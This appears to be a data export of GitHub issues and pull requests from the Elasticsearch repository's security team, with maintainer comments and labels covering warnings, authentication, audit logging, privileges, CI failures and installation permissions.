I get that Elasticsearch is just trying to head off trouble for people who might install an unprotected system on an internet accessible machine. My system is very well protected by an outer layer access control and I have zero interest in having to jump through hoops like this. It's the middle of the night, and now I have to do this meaningless stuff, then reach out to a dozen users and explain to them that they're going to have to enter a username and password after they get through Cloudflare Access.

This really needs a configuration option like this:

xpack.security.stfu: immediately


","It's unclear what warning you are talking about: every deprecation warning emitted by Elasticsearch v7.15.0 starts with `Warning: 299 Elasticsearch-7.15.0-79d65f6e357953a5b3cbcc5e2c7c21073d89aa29`. I'm going to guess you mean the message with content `Elasticsearch built-in security features are not enabled. Without authentication, your cluster could be accessible to anyone. See https://www.elastic.co/guide/en/elasticsearch/reference/7.15/security-minimal-setup.html to enable security.` If so you can suppress this warning by configuring security as per the linked docs, or by explicitly indicating to Elasticsearch that you do not want to use the built-in security features by setting `xpack.security.enabled: false`.Pinging @elastic/es-security (Team:Security)IMO there's some kind of a docs bug here, this new warning is pretty chatty but doesn't get a mention in the release notes and I don't see anything obvious which suggests that setting `xpack.security.enabled: false` will help users that prefer to implement their own security protections around Elasticsearch rather than using the built-in features.Pinging @elastic/es-docs (Team:Docs)I hit this as well, with a fresh local install via brew, and it does make doing anything quite annoying as the messages flood the screen and clicking each one individually is the only way to get rid of them 

<img width=""476"" alt=""Screen Shot 2021-10-05 at 3 16 54 PM"" src=""https://user-images.githubusercontent.com/29006086/136215367-81051383-af52-4fad-8330-bbe9be0b03f1.png"">
The same message also appears at the top of every response in Console. There's no way to dismiss this message unless you explicitly enable security. It's a _very good_ thing to enable security, but not having the ability to dismiss the toast notifications or suppress the warning in responses is not ideal and creates a frustrating UX.

cc: @thomheymann and @bytebilly 

![image](https://user-images.githubusercontent.com/25848033/137007583-d042f069-3971-4a06-9d5f-2b2fb815e6c4.png)
This message was added to Elasticsearch in 7.13 through the changes in [#70114](https://github.com/elastic/elasticsearch/pull/70114/files#diff-c7609b8c419587f985a3042e278fd899f09ca53ecd5cd06db48905ca7df008d0R121-R123). Oddly, the notification issues don't seem to occur in Kibana until 7.15. Thanks for raising this issue. The warning is intentional, the annoying UX clearly is not, and may be due to a mix of changes.

You can disable all security warnings by setting `xpack.security.enabled: false` in the Elasticsearch configuration file, if this is really what you want to do and deployment is properly protected at some other layer.

We are discussing possible ways to improve the experience, even if the problem will not be there in 8.x where security will be enabled by default for all tiers.> You can disable all security warnings by setting `xpack.security.enabled: false` in the Elasticsearch configuration file, if this is really what you want to do and deployment is properly protected at some other layer.

I've got `xpack.security.enabled: false` set, and I'm still getting a similar warning in Kibana in 7.15.0:

![image](https://user-images.githubusercontent.com/81439124/141330166-9b5ebe55-6f32-4d37-adf5-a10aab94ce12.png)

...this is when I'm trying to view the `filebeat-*` index pattern in Kibana.Hi @drenze-athene, thanks for reporting that. What you see is not a security-related warning, so it's not disabled by that setting.

Where in Kibana are you getting this message? Is this flooding the UI, or is it just a single instance? Thanks.This is flooding the UI, every time I attempt to view something in Discover or Dashboard. If there's a way to suppress this for now, I'd be obliged...I'm not sure why accessing `filebeat-*` imply access to `.tasks`. They seem two unrelated events. Is that happening with other patterns too?Yes.

Douglas J. Renze
INFRASTRUCTURE ENGINEER III


From: Fabio Busatto ***@***.***>
Date: Tuesday, November 16, 2021 at 4:15 AM
To: elastic/elasticsearch ***@***.***>
Cc: Douglas Renze ***@***.***>, Mention ***@***.***>
Subject: Re: [elastic/elasticsearch] Spectacularly Annoying: Warning: 299 Elasticsearch-7.15.0-79d65f6e357953a5b3cbcc5e2c7c21073d89aa29 (#78500)

ATTENTION: External Email - Be Suspicious of Attachments, Links and Requests for Login Information.

I'm not sure why accessing filebeat-* imply access to .tasks. They seem two unrelated events. Is that happening with other patterns too?

—
You are receiving this because you were mentioned.
Reply to this email directly, view it on GitHub<https://nam12.safelinks.protection.outlook.com/?url=https%3A%2F%2Fgithub.com%2Felastic%2Felasticsearch%2Fissues%2F78500%23issuecomment-970121650&data=04%7C01%7Cdrenze%40athene.com%7Cf61c10d93fe441d819aa08d9a8ea0758%7C70559d03915449e19e59be933c7f8440%7C0%7C0%7C637726545381023837%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000&sdata=nZ6tWkSOCbs7GY7fQWDyOQEjUHTU3%2F2eqet026b4bfk%3D&reserved=0>, or unsubscribe<https://nam12.safelinks.protection.outlook.com/?url=https%3A%2F%2Fgithub.com%2Fnotifications%2Funsubscribe-auth%2FATNKTFGS6GYDSCV7FSNHDKDUMIVMNANCNFSM5FBUD65A&data=04%7C01%7Cdrenze%40athene.com%7Cf61c10d93fe441d819aa08d9a8ea0758%7C70559d03915449e19e59be933c7f8440%7C0%7C0%7C637726545381033790%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000&sdata=mGbT1kxMMPybWyRZs9UPDyRJ1NSHmEPj%2Fgja93LmrQ0%3D&reserved=0>.
Triage notifications on the go with GitHub Mobile for iOS<https://nam12.safelinks.protection.outlook.com/?url=https%3A%2F%2Fapps.apple.com%2Fapp%2Fapple-store%2Fid1477376905%3Fct%3Dnotification-email%26mt%3D8%26pt%3D524675&data=04%7C01%7Cdrenze%40athene.com%7Cf61c10d93fe441d819aa08d9a8ea0758%7C70559d03915449e19e59be933c7f8440%7C0%7C0%7C637726545381043749%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000&sdata=u%2ByJJ6hLSfLgQBahcCTFLw3%2FQqaHhZm3AFTSm3RJc1E%3D&reserved=0> or Android<https://nam12.safelinks.protection.outlook.com/?url=https%3A%2F%2Fplay.google.com%2Fstore%2Fapps%2Fdetails%3Fid%3Dcom.github.android%26referrer%3Dutm_campaign%253Dnotification-email%2526utm_medium%253Demail%2526utm_source%253Dgithub&data=04%7C01%7Cdrenze%40athene.com%7Cf61c10d93fe441d819aa08d9a8ea0758%7C70559d03915449e19e59be933c7f8440%7C0%7C0%7C637726545381043749%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000&sdata=HLHfyOkEMTd5sISc69gUnXklGiusHtfJp78HZQLU7ig%3D&reserved=0>.

Electronic communication sent through the internet is not secure and its delivery is not guaranteed. This e-mail communication and any attachments may contain confidential and privileged information for the use of the designated recipients named above. If you are not the intended recipient, you are hereby notified that you have received this communication in error and that any review, disclosure, dissemination, distribution or copying of it or its contents is prohibited. If you have received this communication in error, please notify me immediately by replying to this message and deleting it from your computer. All annuity products and services are offered through Athene Annuity & Life Assurance Company and Athene Annuity and Life Company, in all states except New York, and in New York through Athene Annuity & Life Assurance Company of New York and Athene Life Insurance Company of New York. All investment advisory services are rendered solely through Apollo Insurance Solutions Group LLC. None of the information contained herein should be construed as an offer or sale of any security, product, or service of Apollo Insurance Solutions Group LLC. Past performance is not indicative of future success.
I jumped through the hoops in order to stop this and I see it was a more general problem, looks like it's been properly addressed. Am I supposed to close this?",no,">bug,>docs,:Security/Security,Team:Docs,Team:Security,v7.15.3,v8.6.0,"
elastic/elasticsearch,755158466,"Add support for radius authentication","
There are some authentication methods for kibana integrated like saml but still no radius. It would be awesome if users of kibana can get authenticated throud radius server.","Pinging @elastic/kibana-security (Team:Security)Hey @Ayakashi97,

Thanks for filing this! But as was suggested to you [here](https://discuss.elastic.co/t/kibana-authenticate-via-radius/256952/4) it'd make more sense to open this issue in the [Elasticsearch repository](https://github.com/elastic/elasticsearch/issues) instead.

To support this on the Kibana side it first needs to be implemented in the Elasticsearch. I'll transfer the issue.Pinging @elastic/es-security (Team:Security)Thanks for raising this proposal.
We don't have plans to include RADIUS support into Elasticsearch in our current roadmap.

However, it may be possible to use a [custom realm](https://www.elastic.co/guide/en/elasticsearch/reference/current/custom-realms.html) for that, but we haven't analyzed this option in details.",no,">feature,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1273305754,"`TokenService` - drop BWC support for tokens created in pre-`7.17` ES versions  ","Throughout the evolution of the `TokenService`, we've ensured that access tokens created in older versions remain valid in newer versions of ES. Effectively, upgrades should remain ""unnoticable"" to end-users and not affect their Kibana sessions; access tokens created before a version upgrade (or during, in case of a rolling upgrade) should remain valid _after_ the upgrade.

As a result, there is a lot of code that handles BWC for legacy tokens. A guesstimate is over 20% of the entire class. This makes the service harder to understand, maintain, and evolve.

This issue proposes to remove BWC support code for tokens from ES versions older than `7.17`. The rationale is:
 
1. Tokens are ephemeral and short-lived; they expire after at most one hour. As such, all the support burden is to effectively ensure a BWC window of one hour. After an upgrade is complete, new tokens are created according the format and rules of the new ES version. 
1. To upgrade to `8.x` from pre-`7.17`, customers _must_ first upgrade to `7.17`. `7.17` tokens remain fully compatible with `8.x`.

The benefits of maintaining BWC in this case don't seem to justify the overall maintenance burden.

By removing BWC support, customers would only be impacted if they upgraded from `pre-7.17` -> `7.17` -> `8.x` in under an hour. The impact itself would be modest: end-users with ""unsupported"", still-active legacy tokens would have to repeat login. This holds for upgrades in ESS as well; an upgrade using the migration assistant involves a forced logout in Kibana already. As such, users actually performing the upgrade won't get affected by legacy tokens. 

The code we should cut (there may be more):

- [ ] Handling tokens stored in the `.security` index (we introduced a [dedicated index for tokens in 7.2](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/TokenService.java#L215)) 
- [ ] Handling tokens stored as UUIDs (also [7.2](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/TokenService.java#L215))
- [ ] Handling signed tokens (this is a big one; [this code section](https://github.com/elastic/elasticsearch/blob/eb8c4ba97b41a0ad41c535d642d462616e91decc/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/TokenService.java#L2286-L2649) and more could be cut entirely) 
","Pinging @elastic/es-security (Team:Security)We've discussed internally and agreed to move ahead with this. When we pick this up, we should give control plane folks a heads up on our plan.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,913139098,"Audit logs for AutoPutMapping don't include index name","I haven't tracked this down, but I noticed it in `7.11.2`

I issued a bulk request that triggered auto index creation, and the `indices:admin/mapping/auto_put` audit entries don't include the index name.
```
{
  ""type"": ""audit"",
  ""timestamp"": ""2021-06-07T16:03:26,680+1000"",
  ""node.id"": ""i1xZMYXlQgymz97Hgd8Omw"",
  ""event.type"": ""transport"",
  ""event.action"": ""access_granted"",
  ""authentication.type"": ""REALM"",
  ""user.name"": ""test"",
  ""user.realm"": ""default_native"",
  ""user.roles"": [
    ""test""
  ],
  ""origin.type"": ""rest"",
  ""origin.address"": ""[::1]:52142"",
  ""request.id"": ""UIUzvuJ0Rs2xgDLAz3pMmg"",
  ""action"": ""indices:admin/mapping/auto_put"",
  ""request.name"": ""PutMappingRequest""
}
{
  ""type"": ""audit"",
  ""timestamp"": ""2021-06-07T16:03:26,681+1000"",
  ""node.id"": ""i1xZMYXlQgymz97Hgd8Omw"",
  ""event.type"": ""transport"",
  ""event.action"": ""access_granted"",
  ""authentication.type"": ""REALM"",
  ""user.name"": ""test"",
  ""user.realm"": ""default_native"",
  ""user.roles"": [
    ""test""
  ],
  ""origin.type"": ""rest"",
  ""origin.address"": ""[::1]:52142"",
  ""request.id"": ""UIUzvuJ0Rs2xgDLAz3pMmg"",
  ""action"": ""indices:admin/mapping/auto_put"",
  ""request.name"": ""PutMappingRequest""
}
```
","Pinging @elastic/es-security (Team:Security)For context,

An [`AutoPutMapping`](https://github.com/elastic/elasticsearch/blob/v8.0.0-alpha2/server/src/main/java/org/elasticsearch/action/admin/indices/mapping/put/AutoPutMappingAction.java) action is triggered when an ingest to an index would cause the index's mapping to change.

This happens out of the box with Elasticsearch because we ship with [dynamic mapping](https://www.elastic.co/guide/en/elasticsearch/reference/current/dynamic-mapping.html) enabled. 

That means you can install a brand new ES node with a config like this:
```
node.name: node01

xpack.license.self_generated.type: trial

xpack.security.enabled: true
xpack.security.audit.enabled: true
```

And then write to a new index like this:
```
PUT /index-1/_doc/1
{
  ""field"": ""value""
}
``` 

and the index will be automatically created, including a default mapping.

That will generate an audit log roughly like this:

- `{""type"":""audit"", ""timestamp"":""2021-11-01T14:09:27,753+1100"", ""node.id"":""KSFmGXsLTuyOkypUndKw6A"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:64276"", ""request.id"":""19hZ78lERL6rKcyyVt7-HQ"", ""action"":""indices:data/write/index"", ""request.name"":""IndexRequest"", ""indices"":[""index-1""]}`
- `{""type"":""audit"", ""timestamp"":""2021-11-01T14:09:27,754+1100"", ""node.id"":""KSFmGXsLTuyOkypUndKw6A"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:64276"", ""request.id"":""19hZ78lERL6rKcyyVt7-HQ"", ""action"":""indices:data/write/bulk"", ""request.name"":""BulkRequest""}`
- `{""type"":""audit"", ""timestamp"":""2021-11-01T14:09:27,757+1100"", ""node.id"":""KSFmGXsLTuyOkypUndKw6A"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:64276"", ""request.id"":""19hZ78lERL6rKcyyVt7-HQ"", ""action"":""indices:admin/auto_create"", ""request.name"":""CreateIndexRequest"", ""indices"":[""index-1""]}`
- `{""type"":""audit"", ""timestamp"":""2021-11-01T14:09:28,417+1100"", ""node.id"":""KSFmGXsLTuyOkypUndKw6A"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:64276"", ""request.id"":""19hZ78lERL6rKcyyVt7-HQ"", ""action"":""indices:data/write/bulk[s]"", ""request.name"":""BulkShardRequest"", ""indices"":[""index-1""]}`
- `{""type"":""audit"", ""timestamp"":""2021-11-01T14:09:28,421+1100"", ""node.id"":""KSFmGXsLTuyOkypUndKw6A"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:64276"", ""request.id"":""19hZ78lERL6rKcyyVt7-HQ"", ""action"":""indices:data/write/index:op_type/index"", ""request.name"":""BulkItemRequest"", ""indices"":[""index-1""]}`
- `{""type"":""audit"", ""timestamp"":""2021-11-01T14:09:28,423+1100"", ""node.id"":""KSFmGXsLTuyOkypUndKw6A"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:64276"", ""request.id"":""19hZ78lERL6rKcyyVt7-HQ"", ""action"":""indices:data/write/bulk[s][p]"", ""request.name"":""BulkShardRequest"", ""indices"":[""index-1""]}`
- `{""type"":""audit"", ""timestamp"":""2021-11-01T14:09:28,447+1100"", ""node.id"":""KSFmGXsLTuyOkypUndKw6A"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:64276"", ""request.id"":""19hZ78lERL6rKcyyVt7-HQ"", ""action"":""indices:admin/mapping/auto_put"", ""request.name"":""PutMappingRequest""}`

Walking through those entries we get these actions:
1. `indices:data/write/index` - The incoming request ""**index** a document"" 
2. `indices:data/write/bulk` - Internally to ES, we route all documents writes through the **bulk** action so that there is a single path for all types of ingestion
3. `indices:admin/auto_create` - Since the index doesn't exist we **automatically create** the **index**
4. `indices:data/write/bulk[s]` - Then we write a **bulk** entries (although in this case there is only 1) to the relevant **shard**
5. `indices:data/write/index:op_type/index` - Within the shard action we check each item to ensure the user is allowed to perform that action on the shard. This is an **index** action, with an **operation type** of **index** (as opposed to create or update)
6. `indices:data/write/bulk[s][p]` - Perform the **bulk** action on the **primary shard**
7. `indices:admin/mapping/auto_put` - Because thre is a new field in the document that doesn't exist in the mapping, and dynamic mapping is enabled for this index (and all others), we **automatically put** a new **mapping**. 

And while the auto_create index audit log from step 3 has `""indices"":[""index-1""]` , the auto_put mapping audit log (step 7) does not. But it should because it is an action on a single index.

Thank you. Your detailed explanation helped, especially the examples.

I have one quick follow up question. Should step 2 `indices:data/write/bulk` have `""indices"":[""index-1""]` too? It seems like all of the examples have `""indices"":[""index-1""]` except 2 and 7.It would probably be helpful if `BulkRequest` contained indices. It's less of an issue because if actually does anything it will do so by triggering a `BulkShardRequest` which contains the index name.
Depending on how we tackle the issue, I think it would be reasonable to add to the audit log, but if there are particular obstacles then we could go without it.
",no,">bug,:Security/Audit,Team:Security,v8.6.0,"
elastic/elasticsearch,895698625,"Disallow realm names with a leading underscore","The underscore character is often used inside Elasticsearch to signal a string being reserved, e.g. metadata keys. For realm names, elasticsearch also creates synthetic realm name with a leading underscore. But currently it is not reserved which means an user can configure a realm which looks like a synthetic realm. This creates confusion. We should deprecate realm names with leading underscore in 7.x and ~~disallow it in 8.0~~","Pinging @elastic/es-security (Team:Security)**UPDATE**

Since the realm name plays an important role in API key ownership, this makes it hard for cluster admins to change the realm names. Therefore we decided to only deprecate it for now, including 8.0. Removal will be re-considered in future.",no,">breaking,:Security/Authentication,Team:Security,"
elastic/elasticsearch,589926817,"Configurable time windows for API Key cleanup job","~Currently invalidated API Keys are never removed from the security index.~

Currently invalidated API Keys are automatically removed from the security index approximately every 24h.

Some use cases will generate a lot of relatively short lived API keys, and an ever-increasing number of documents in the security index & need this frequent cleanup.

However, we ought to move towards a model favouring soft-delete (invalidation) of API keys with a longer cleanup window because it provides better safety from an audit point of view - no one can ever perform an operation with an API key and then immediately delete it to cover their tracks.

That is, there should be a configurable time frame after which invalidated API keys will be permanently deleted. 
For typically installations, a period of about 90 days seems reasonable, but making it configurable would allow installations with very high API key churn to remove them more aggressively.
","Pinging @elastic/es-security (:Security/Authentication)We can do some improvement in this area, even if I feel that it's hard to find an interval that is good for all the use cases. Making it customizable is an option, but it seems to me too fine-grained and users can realize there is a specific setting for that too late, when they already have lost data.
For compliance purposes, it may be years.

I'd rather see improvements in API key auditing more useful to satisfy this requirement. If we track when an API is created (with associated properties) and when it is deleted, we probably don't need to look into the security index anymore, and the trail will be automatically available based on the audit retention policy.

This requires a relevant change in the way we audit (e.g. getting data not from the request), but we should probably do that anyway for other events, so it may make sense to start here.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,885977077,"Deprecate read_cross_cluster privilege","As discussed in #58476, the `read_cross_cluster` privilege should be deprecated and replaced by just the `read` privilege because:
1. The actions covered by `read_cross_cluster` are implementation details
2. The need for `read_cross_cluster` is inconsistent depends on the setup. Our [docs](https://www.elastic.co/guide/en/elasticsearch/reference/master/cross-cluster-configuring.html#cross-cluster-kibana) recommend it, but it is not always necessary. In fact, it is not necessary for the [example](https://www.elastic.co/guide/en/elasticsearch/reference/master/cross-cluster-configuring.html#cross-cluster-configuring-example) given by the docs. This creates confusion.
3. The `read_cross_cluster` privilege does not grant any more permission in terms of data reading compared to the `read` privilege. It cares about how the data is accessed (locally or remotely). This is an anomaly because ES index privileges grant access to data not to how data is accessed.
4. We do want to improve our security model for CCS/CCR. But it is a bigger topic and separate issue than what `read_cross_cluster` privilege provides. In additiona, sometimes it creates confusion because it seems to suggest more advanced security for remote clusters which is not true.","Pinging @elastic/es-security (Team:Security)Not a requirement from my perspective, but if the privileges can also be marked as deprecated in the [built-in privileges api](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-get-builtin-privileges.html) or similar, then we’d have an opportunity to surface this in Kibana’s role management page: https://github.com/elastic/kibana/issues/46609
Related: https://github.com/elastic/elasticsearch/issues/41181",no,">deprecation,:Security/Authorization,Team:Security,"
elastic/elasticsearch,727193980,"[CI] bouncycastle.tls.TlsFatalAlert: handshake_failure(40)","**Build scan**:
https://gradle-enterprise.elastic.co/s/ugq5y3o4yrdgq
https://gradle-enterprise.elastic.co/s/anyrby5ddynwq

**Repro line**:
- `./gradlew ':x-pack:plugin:security:internalClusterTest' --tests ""org.elasticsearch.xpack.security.authz.SnapshotUserRoleIntegTests.testSnapshotUserRoleCanSnapshotAndSeeAllIndices"" -Dtests.seed=F4A3DCA82E28F4F1 -Dtests.security.manager=true -Dtests.locale=tr-TR -Dtests.timezone=Etc/GMT-4 -Druntime.java=11 -Dtests.fips.enabled=true`
- `./gradlew ':x-pack:plugin:security:internalClusterTest' --tests ""org.elasticsearch.xpack.security.transport.ServerTransportFilterIntegrationTests.testThatConnectionToClientTypeConnectionIsRejected"" -Dtests.seed=EB44AB73D78B668B -Dtests.security.manager=true -Dtests.locale=zh-TW -Dtests.timezone=MET -Druntime.java=11 -Dtests.fips.enabled=true`

**Reproduces locally?**: No

**Applicable branches**: master, 7.x

**Failure history**: Failed twice in different classes and test methods
**Failure excerpt**:

```
 2> 十月 22, 2020 5:37:02 上午 org.bouncycastle.jsse.provider.ProvTlsServer notifyAlertRaised
  2> 資訊: Server raised fatal(2) handshake_failure(40) alert: Failed to process record
  2> org.bouncycastle.tls.TlsFatalAlert: handshake_failure(40)
  2> 	at org.bouncycastle.tls.TlsProtocol.handleAlertWarningMessage(TlsProtocol.java:184)
  2> 	at org.bouncycastle.tls.TlsServerProtocol.handleAlertWarningMessage(TlsServerProtocol.java:413)
  2> 	at org.bouncycastle.tls.TlsProtocol.handleAlertMessage(TlsProtocol.java:161)
  2> 	at org.bouncycastle.tls.TlsProtocol.processAlertQueue(TlsProtocol.java:570)
  2> 	at org.bouncycastle.tls.TlsProtocol.processRecord(TlsProtocol.java:435)
  2> 	at org.bouncycastle.tls.RecordStream.readFullRecord(RecordStream.java:184)
  2> 	at org.bouncycastle.tls.TlsProtocol.safeReadFullRecord(TlsProtocol.java:727)
  2> 	at org.bouncycastle.tls.TlsProtocol.offerInput(TlsProtocol.java:1059)
  2> 	at org.bouncycastle.tls.TlsProtocol.offerInput(TlsProtocol.java:1027)
  2> 	at org.bouncycastle.jsse.provider.ProvSSLEngine.unwrap(ProvSSLEngine.java:445)
  2> 	at java.base/javax.net.ssl.SSLEngine.unwrap(SSLEngine.java:677)
  2> 	at org.elasticsearch.xpack.security.transport.nio.SSLDriver.unwrap(SSLDriver.java:178)
  2> 	at org.elasticsearch.xpack.security.transport.nio.SSLDriver.access$1300(SSLDriver.java:50)
  2> 	at org.elasticsearch.xpack.security.transport.nio.SSLDriver$RegularMode.read(SSLDriver.java:327)
  2> 	at org.elasticsearch.xpack.security.transport.nio.SSLDriver.read(SSLDriver.java:119)
  2> 	at org.elasticsearch.xpack.security.transport.nio.SSLChannelContext.read(SSLChannelContext.java:165)
  2> 	at org.elasticsearch.nio.EventHandler.handleRead(EventHandler.java:139)
  2> 	at org.elasticsearch.nio.NioSelector.handleRead(NioSelector.java:420)
  2> 	at org.elasticsearch.nio.NioSelector.processKey(NioSelector.java:246)
  2> 	at org.elasticsearch.nio.NioSelector.singleLoop(NioSelector.java:174)
  2> 	at org.elasticsearch.nio.NioSelector.runLoop(NioSelector.java:131)
  2> 	at java.base/java.lang.Thread.run(Thread.java:834)
```

with the following test failing:

```
org.elasticsearch.xpack.security.transport.ServerTransportFilterIntegrationTests > testThatConnectionToClientTypeConnectionIsRejected FAILED
    ProcessClusterEventTimeoutException[failed to process cluster event (delete_repository [*]) within 30s]
        at __randomizedtesting.SeedInfo.seed([EB44AB73D78B668B:D02A53132EE64A57]:0)
        at org.elasticsearch.cluster.service.MasterService$Batcher.lambda$onTimeout$0(MasterService.java:143)
        at java.util.ArrayList.forEach(ArrayList.java:1541)
        at org.elasticsearch.cluster.service.MasterService$Batcher.lambda$onTimeout$1(MasterService.java:142)
        at org.elasticsearch.common.util.concurrent.ThreadContext$ContextPreservingRunnable.run(ThreadContext.java:678)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
        at java.lang.Thread.run(Thread.java:834)
```","Pinging @elastic/es-security (:Security/Network)",no,">test-failure,Team:Security,:Security/FIPS,"
elastic/elasticsearch,1381619222,"Native users can disable themselves with PutUser API","We prevent native users from disabling themselves with the [DisableUser API](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-disable-user.html).

https://github.com/elastic/elasticsearch/blob/369dca3b923f0f07ce69b26b5a1b7a5dcc1ac10f/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/action/user/TransportSetEnabledAction.java#L52-L53

But the same check is not performed in [PutUser API](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-put-user.html). As such, native users can disable themselves with it.

We should prevent native users from disabling themselves with PutUser API. Or at least we should make it disabling behaviour consistent between DisableUser API and PutUser API.","Pinging @elastic/es-security (Team:Security)",no,">bug,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1239849116,"installation on windows must be done as admin","As reported by users, the `.\bin\elasticsearch.bat` command must be executed as an administrator, but this is not 100% clear from the documentation. Thus submitting this pull request adding this detail.

","@magorbalassy please enable the option ""Allow edits and access to secrets by maintainers"" on your PR. For more information, [see the documentation](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/allowing-changes-to-a-pull-request-branch-created-from-a-fork).Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-delivery (Team:Delivery)@magorbalassy I don't think running as an administrator account is strictly necessary but we don't enumerate in the documentation the specific permissions that are required. Can you elaborate on ""As reported by users""? What specific issues have they encountered running as a non-Administrator?When the batch file is executed as a normal user, the person will be unable to create an enrollment token., getting the following  errors:

1. Enrollment with user account
Enduser tried to enroll with a user account but they get this **error** when starting kibana:
```
[2022-05-02T11:00:04.615+02:00][ERROR][elasticsearch-service] Unable to retrieve version information from Elasticsearch nodes. security_exception: [security_exception] Reason: unable to authenticate user [elasticsearchuser] for REST request [/_nodes?filter_path=nodes.*.version%2Cnodes.*.http.publish_address%2Cnodes
```

2. When trying to use the `elasticsearch-create-enrollment-token` , Call `C:\elastic\elasticsearch-8.1.3\bin>elasticsearch-create-enrollment-token -s kibana --url ""http://localhost:9200/`
User getting the following error:
```
**ERROR**: Unable to create an enrollment token. Elasticsearch node HTTP layer SSL configuration is not configured with a keystore 
```
When installed as admin, these errors aren't present.

When these above steps are performed as a non-admin user, the TLS is not configured and no enrollment token is generated and the only notification is a warning about access to the folder. 




Pinging @elastic/es-security (Team:Security)Perhaps someone from @elastic/es-security can provide some insight here. Should admin rights be required for creating an enrollment token? Is this something we should add to the documentation as suggested?> the only notification is a warning about access to the folder.

The initial security auto-configuration needs write permission to the `config` folder (so not necessary adminstrator) Otherwise, you should see a message that says
> Could not create auto-configuration directory

But it's not a warning. Maybe we could make this message stand out a bit more.

When that happens,  the node will start with no TLS configured. That seems to match the provided error about ""SSL is not configured with a keystore"".

@albertzaharovits for more insights.I think that's right, Yang.
Security auto-configuration was skipped (because of filesystem permissions) and the node started without TLS. I would've guessed that the ES logs made that clear, but I agree that the various cmd-line tools/APIs/Kibana do not error with an explicit error saying something like: ""node is not using auto-configured TLS"".So the bring this around, this isn't really Windows-specific at all. You'd get similar errors on any platform if the user running Elasticsearch cannot write to the `config` directory. Should we make that more obvious in the error messages if that's not already the case? > So the bring this around, this isn't really Windows-specific at all. You'd get similar errors on any platform if the user running Elasticsearch cannot write to the `config` directory. Should we make that more obvious in the error messages if that's not already the case?

@mark-vieira, we recently added [documentation](https://www.elastic.co/guide/en/elasticsearch/reference/current/configuring-stack-security.html#stack-skip-auto-configuration) to describe the cases (like this one) when security can't be configured automatically. So I think we have a few things here:

1. When we can't auto-configure security we continue on and it's easy to miss that SSL wasn't setup.
2. When creating an enrollment token after auto-security fails the failure message is pretty confusing.
  ```
  **ERROR**: Unable to create an enrollment token. Elasticsearch node HTTP layer SSL configuration is not configured with a keystore 
  ```
3. Starting ES with an enrollment token requires write permissions to the config directory.

There's probably some usability/documentation improvements here that could be done. Perhaps we should capture these in separate issues and close out this PR since running as an admin isn't strictly necessary or even the best solution here.",yes,">docs,:Delivery/Packaging,:Security/Security,Team:Docs,Team:Security,Team:Delivery,external-contributor,v8.2.2,"
elastic/elasticsearch,507761269,"Username letter case for role mapping","Role mapping IS letter case dependent if the rule to map roles looks at the `username` field. If the rule looks at the `dn` or `groups` fields, then it IS NOT letter case dependent. What this is contingent upon is the datatype of the field (`DistinguishedName` for `dn` and `groups`, and `String` for `username`).

Most of the time this works flawlessly, but in the case of `LDAP` and `AD` realms, the `username`, although of type `String`, is used as part of a DN during a bind operation, during authentication. In this situation the letter casing of the `username` is not important during authentication but it is still relevant during role mapping.

Given that the `username`, of type `String`, is letter case agnostic for certain realms during authentication, should the role mapping process also be agnostic of letter cases when dealing with such users in such realms? I think it should (hence labeling it a bug), but first I think we must make realms express if they account or not for username letter casing. ","Pinging @elastic/es-security (:Security/Authentication)We discussed this in our weekly meeting.

